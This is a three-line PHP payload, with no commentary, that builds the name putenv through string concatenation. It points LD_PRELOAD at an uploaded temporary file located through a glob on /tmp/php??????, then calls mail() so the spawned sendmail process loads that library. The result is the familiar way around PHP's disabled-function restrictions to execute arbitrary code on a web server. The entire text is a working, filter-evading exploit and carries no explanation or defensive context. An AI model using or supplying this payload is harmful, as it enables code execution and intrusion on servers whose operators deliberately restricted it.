<?php
("put"."env")("LD_PRELOAD=/tmp/".(new DirectoryIterator("glob:///tmp/php??????")));
mail("","","","");